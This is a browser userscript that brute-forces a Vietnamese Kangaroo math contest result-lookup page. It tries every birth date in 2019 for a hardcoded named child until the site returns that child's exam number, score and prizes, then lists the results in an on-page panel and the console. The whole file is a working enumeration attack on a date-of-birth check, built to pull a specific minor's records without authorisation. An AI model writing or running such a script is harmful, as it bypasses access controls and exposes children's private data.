// ==UserScript==
// @name         Kangaroo Brute Force Multi
// @namespace    http://tampermonkey.net/
// @version      2.1
// @match        https://kangaroo-math.vn/tra-cuu-ket-qua-ikmc*
// @grant        none
// ==/UserScript==

(function () {
    'use strict';

    const TARGET_YEAR = 2019;
    const DELAY_MS = 300;
    const MAX_DAY = 31;
    const MAX_MONTH = 12;

const TARGET_NAMES = [
        'Phạm Đình Tùng',
    ];

    const allResults = [];

    function sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }

    function parseScore(scoreStr) {
        if (!scoreStr) {
            return 0;
        }
        const num = parseFloat(String(scoreStr).replace(',', '.'));
        return isNaN(num) ? 0 : num;
    }

    function sortedTable(results) {
        return [...results]
            .sort((a, b) => parseScore(b.score) - parseScore(a.score))
            .map((r, i) => ({
                '#': i + 1,
                'Tên': r.name,
                'Ngày sinh': r.dob,
                'SBD': r.examNumber,
                'Điểm': r.score || '—',
                'Giải chính': r.mainPrize || 'Không có',
                'Giải phụ': r.subPrize || 'Không có',
            }));
    }

    function buildUI() {
        const panel = document.createElement('div');
        panel.style.cssText = 'position:fixed;top:20px;right:20px;z-index:99999;background:#fff;border:2px solid #5d1e62;border-radius:12px;padding:16px;width:360px;font-family:Arial,sans-serif;box-shadow:0 4px 20px rgba(0,0,0,0.2);';
        panel.innerHTML = `
            <div style="font-weight:bold;color:#5d1e62;margin-bottom:8px;font-size:15px;">🔍 Brute Force Multi (${TARGET_NAMES.length} tên)</div>
            <div id="bf-person" style="font-size:13px;color:#333;margin-bottom:4px;">—</div>
            <div id="bf-status" style="font-size:12px;color:#555;margin-bottom:8px;">Chưa chạy</div>
            <div id="bf-overall" style="font-size:12px;color:#888;margin-bottom:6px;">Tiến độ tổng: 0 / ${TARGET_NAMES.length} người</div>
            <div id="bf-progress" style="background:#eee;border-radius:6px;height:10px;margin-bottom:10px;">
                <div id="bf-bar" style="background:#5d1e62;height:10px;border-radius:6px;width:0%;transition:width 0.2s;"></div>
            </div>
            <div id="bf-result" style="font-size:12px;color:green;font-weight:bold;min-height:20px;word-break:break-all;max-height:220px;overflow-y:auto;"></div>
            <div style="margin-top:10px;display:flex;gap:8px;">
                <button id="bf-start" style="flex:1;background:#5d1e62;color:#fff;border:none;border-radius:6px;padding:8px;cursor:pointer;font-size:13px;">Bắt đầu</button>
                <button id="bf-stop" style="flex:1;background:#b42318;color:#fff;border:none;border-radius:6px;padding:8px;cursor:pointer;font-size:13px;" disabled>Dừng</button>
                <button id="bf-dump" style="flex:1;background:#1565c0;color:#fff;border:none;border-radius:6px;padding:8px;cursor:pointer;font-size:13px;">Log tất cả</button>
            </div>
        `;
        document.body.appendChild(panel);
    }

    let stopFlag = false;

    async function searchOnePerson(name) {
        const statusEl = document.getElementById('bf-status');
        const barEl = document.getElementById('bf-bar');
        const resultEl = document.getElementById('bf-result');
        const total = MAX_DAY * MAX_MONTH;
        const found = [];

        for (let month = 1; month <= MAX_MONTH; month++) {
            for (let day = 1; day <= MAX_DAY; day++) {
                if (stopFlag) {
                    return found;
                }

                const count = (month - 1) * MAX_DAY + day;
                const percent = Math.round((count / total) * 100);
                barEl.style.width = percent + '%';
                statusEl.textContent = `Thử: ${day}/${month}/${TARGET_YEAR} (${count}/${total})`;

                const dob = `${day}/${month}/${TARGET_YEAR}`;
                const url = `/searchExamResult?fullName=${encodeURIComponent(name)}&dob=${encodeURIComponent(dob)}`;

                try {
                    const resp = await fetch(url, { credentials: 'same-origin' });

                    if (!resp.ok) {
                        await sleep(DELAY_MS);
                        continue;
                    }

                    const data = await resp.json();

                    if (data.registrationDetails && data.registrationDetails.length > 0) {
                        const detail = data.registrationDetails[0];
                        const form = Array.isArray(data.registrationForm) ? data.registrationForm[0] : data.registrationForm;
                        const fullName = form ? `${form.lastName || ''} ${form.firstName || ''}`.trim() : name;
                        const score = detail.score ?? detail.diem ?? detail.point ?? null;

                        const record = { name, dob, fullName, examNumber: detail.examNumber, score, mainPrize: detail.mainPrize, subPrize: detail.subPrize, detail, form };
                        found.push(record);
                        allResults.push(record);

                        console.log(`[FOUND] ${name} | ${dob} | SBD: ${detail.examNumber} | Điểm: ${score ?? '—'} | Giải: ${detail.mainPrize || 'Không có'}`);

                        const entry = document.createElement('div');
                        entry.style.cssText = 'border-bottom:1px solid #ddd;padding:4px 0;';
                        entry.innerHTML = `✅ <b>${fullName}</b> — ${dob} — SBD: <b>${detail.examNumber}</b> — Điểm: <b>${score ?? '—'}</b> — Giải: <b>${detail.mainPrize || 'Không có'}</b>`;
                        resultEl.appendChild(entry);
                        resultEl.scrollTop = resultEl.scrollHeight;
                    }
                } catch (e) {
                    console.warn(`Lỗi ${name} ${dob}:`, e);
                }

                await sleep(DELAY_MS);
            }
        }

        return found;
    }

    function dumpResults() {
        console.log('=== KẾT QUẢ (sắp xếp theo điểm giảm dần) ===');
        console.table(sortedTable(allResults));
    }

    async function run() {
        const personEl = document.getElementById('bf-person');
        const statusEl = document.getElementById('bf-status');
        const barEl = document.getElementById('bf-bar');
        const overallEl = document.getElementById('bf-overall');
        const resultEl = document.getElementById('bf-result');
        const startBtn = document.getElementById('bf-start');
        const stopBtn = document.getElementById('bf-stop');

        stopFlag = false;
        allResults.length = 0;
        startBtn.disabled = true;
        stopBtn.disabled = false;
        resultEl.textContent = '';
        barEl.style.width = '0%';
        barEl.style.background = '#5d1e62';

        for (let i = 0; i < TARGET_NAMES.length; i++) {
            if (stopFlag) {
                break;
            }

            const name = TARGET_NAMES[i];
            personEl.innerHTML = `Người ${i + 1}/${TARGET_NAMES.length}: <b>${name}</b>`;
            overallEl.textContent = `Tiến độ tổng: ${i} / ${TARGET_NAMES.length} người xong`;
            barEl.style.width = '0%';

            await searchOnePerson(name);
        }

        if (!stopFlag) {
            overallEl.textContent = `✅ Xong tất cả ${TARGET_NAMES.length} người. Tìm thấy ${allResults.length} kết quả.`;
            barEl.style.width = '100%';
            barEl.style.background = allResults.length > 0 ? '#2e7d32' : '#b42318';
            statusEl.textContent = 'Hoàn thành.';
            personEl.textContent = '—';
        } else {
            statusEl.textContent = `⛔ Đã dừng. Tìm thấy ${allResults.length} kết quả.`;
        }

        dumpResults();
        startBtn.disabled = false;
        stopBtn.disabled = true;
    }

    buildUI();

    document.getElementById('bf-start').addEventListener('click', run);
    document.getElementById('bf-stop').addEventListener('click', () => { stopFlag = true; });
    document.getElementById('bf-dump').addEventListener('click', dumpResults);

})();
